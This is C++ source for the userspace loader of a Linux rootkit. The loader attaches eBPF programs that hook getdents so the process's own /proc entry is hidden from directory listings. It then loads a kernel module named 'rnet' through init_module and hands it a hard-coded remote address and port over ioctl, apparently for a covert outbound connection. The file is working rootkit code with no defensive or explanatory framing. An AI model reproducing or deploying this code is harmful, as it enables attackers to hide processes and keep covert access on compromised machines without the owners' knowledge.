#include "rootkit/Utils.hpp"
#include <csignal>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <iostream>
#include <string>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>

extern "C" {
#include "common.h"
#include "rootkit.skel.h"
#include <bpf/bpf.h>
#include <bpf/libbpf.h>
}

#define RNET_NAME "rnet"
// #define RNET_PATH "../src/module/bin/" RNET_NAME ".ko"
#define RNET_PATH "./" RNET_NAME ".ko"

# define init_module(mod, len, opts) syscall(__NR_init_module, mod, len, opts)
# define delete_module(mod, flags) syscall(__NR_delete_module, mod, flags)

struct SetupData {
    uint64_t inode;
    pid_t pid;
};

static volatile bool exiting = false;
static void sig_handler(int) { exiting = true; }

void clean(struct rootkit_bpf * obj);
struct rootkit_bpf * setup_bpf(SetupData data);
void setup_bpf_program_array_links(struct rootkit_bpf * skel);
struct ring_buffer * get_msg_ring_buffer(
    struct rootkit_bpf * obj,
    struct bpf_map * map,
    int (*callback)(void *, void *, unsigned long)
);
SetupData get_setup_data();

bool load_kernel_module(const std::string& module_path);
void send_data_to_kernel_module(const conn_info& data);
bool unload_kernel_module(const std::string& module_name);

static int rb_event(void * ctx, void * data, size_t data_sz) {
    const struct event * e = reinterpret_cast<const struct event *>(data);
    printf("Hidden Folder: %s, inode: %llu\n", (char *)e->filename, e->inode);
    return 0;
}

int main(int argc, char ** argv) {
    // Set signal handler
    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);

    // Load bpf program and its syscalls
    struct rootkit_bpf * obj = setup_bpf(get_setup_data());
    load_kernel_module(RNET_PATH);

    // Prepare data to send
    struct conn_info data;
    data.dport = 8000;

    auto ip = rootkit::utils::convert_ip("192.168.70.165");
    if (!ip.has_value())
        return 1;

    data.daddr = ip.value();
    data.id = 1;

    send_data_to_kernel_module(data);

    // Get ring buffer for messages from kernel space
    // All messages will be processed by rb_event function
    struct ring_buffer * rb = get_msg_ring_buffer(obj, obj->maps.rb, rb_event);

    std::cout << "listening for events... Ctrl-C to exit\n";

    // Get data from ring buffer till exit signal or error
    while (!exiting) {
        int err = ring_buffer__poll(rb, 1000 /*ms*/);
        if (err < 0) {
            if (errno == EINTR) break;
            std::cerr << "perf_reader__poll error: " << strerror(errno) << "\n";
            break;
        }
    }

    ring_buffer__free(rb);
    clean(obj);
    return 0;
}

void send_data_to_kernel_module(const conn_info& data) {
    int fd = open("/dev/conn_dev", O_RDWR);
    if (fd < 0) {
        perror("Failed to open device");
        return;
    }

    // Send data via ioctl
    if (ioctl(fd, IOCTL_SEND_DATA, &data) < 0) {
        perror("ioctl failed");
        close(fd);
    }
    close(fd);
}

bool load_kernel_module(const std::string& module_path) {
    int fd = open(module_path.c_str(), O_RDONLY);
    if (fd < 0) return false;

    // Get file size
    off_t size = lseek(fd, 0, SEEK_END);
    lseek(fd, 0, SEEK_SET);

    // Read module into memory
    uint8_t * module_data = (uint8_t *) malloc(size);
    read(fd, module_data, size);
    close(fd);

    if (init_module(module_data, size, "") < 0) {
        perror("init_module");
        // Check if the error is permission vs. module state
        if (errno == EPERM) {
            // Operation not permitted - could be SELinux, secure boot, or capability issue
            fprintf(stderr, "Permission denied - check SELinux status, secure boot, or capabilities\n");
        } else if (errno == EEXIST) {
            fprintf(stderr, "Module already loaded\n");
        } else if (errno == ENOEXEC) {
            fprintf(stderr, "Module format error\n");
        }
        exit(-1);
        return false;
    }

    return true;
}

bool unload_kernel_module(const std::string& module_name) {
    // if (syscall(SYS_delete_module, RNET_NAME, O_NONBLOCK) != 0) {
    if (delete_module(RNET_NAME, O_NONBLOCK) < 0) {
        perror("Error unloading module");
        return false;
    }

    return true;
}

void clean(struct rootkit_bpf * obj) {
    rootkit_bpf__destroy(obj);
    unload_kernel_module(RNET_NAME);
}

struct rootkit_bpf * setup_bpf(SetupData data) {
    struct rootkit_bpf * skel;
    int err;

    // Open the skeleton
    skel = rootkit_bpf__open();
    if (!skel) {
        std::cerr << "Failed to open BPF skeleton" << std::endl;
        exit(1);
    }

    // Set volatile consts
    skel->rodata->inode_to_hide = data.inode;

    // Load the program
    err = rootkit_bpf__load(skel);
    if (err) {
        std::cerr << "Failed to load and verify BPF skeleton" << std::endl;
        clean(skel);
        exit(1);
    }

    setup_bpf_program_array_links(skel);

    // Attach to syscalls
    err = rootkit_bpf__attach(skel);
    if (err) {
        std::cerr << "Failed to attach BPF programs\n" << std::endl;
        clean(skel);
        exit(1);
    }

    return skel;
}

void setup_bpf_program_array_links(struct rootkit_bpf * skel) {
    struct BpfProgramIndexInfo {
        size_t index;
        struct bpf_program * program;
        bool auto_attach;
    };

    const BpfProgramIndexInfo index_to_bpf_program[] = {
        {PROG_01, skel->progs.handle_getdents_exit, true},
        {PROG_02, skel->progs.handle_getdents_patch, false}
    };

    // Link right index to right function so the bpf_tail_call can work properly
    for (auto info : index_to_bpf_program) {
        if (info.auto_attach == false)
            bpf_program__set_autoattach(info.program, false);

        int index = info.index;
        int prog_fd = bpf_program__fd(info.program);
        int ret = bpf_map_update_elem(
            bpf_map__fd(skel->maps.prog_array),
            &index,
            &prog_fd,
            BPF_ANY);

        if (ret == -1) {
            std::cerr << "Failed to add program to prog array: " << strerror(errno) << std::endl;
            clean(skel);
            exit(1);
        }
    }
}

struct ring_buffer * get_msg_ring_buffer(
    struct rootkit_bpf * obj,
    struct bpf_map * map,
    int (*callback)(void *, void *, unsigned long)
) {
    int map_fd = bpf_map__fd(map);
    if (map_fd < 0) {
        std::cerr << "failed to get map fd\n";
        clean(obj);
        exit(1);
    }

    // Create perf reader using libbpf helper
    struct ring_buffer * rb = ring_buffer__new(map_fd, callback, NULL, NULL);
    if (!rb) {
        std::cerr << "failed to create perf reader\n";
        clean(obj);
        exit(1);
    }

    return rb;
}

SetupData get_setup_data() {
    SetupData data;
    data.pid = getpid();
    std::cout << "Pid: " << data.pid << std::endl;

    struct stat sb;
    const std::string pid_folder = "/proc/" + std::to_string(data.pid);
    if (stat(pid_folder.c_str(), &sb) == -1) {
        perror("stat");
        exit(1);
    }

    data.inode = sb.st_ino;

    return data;
}
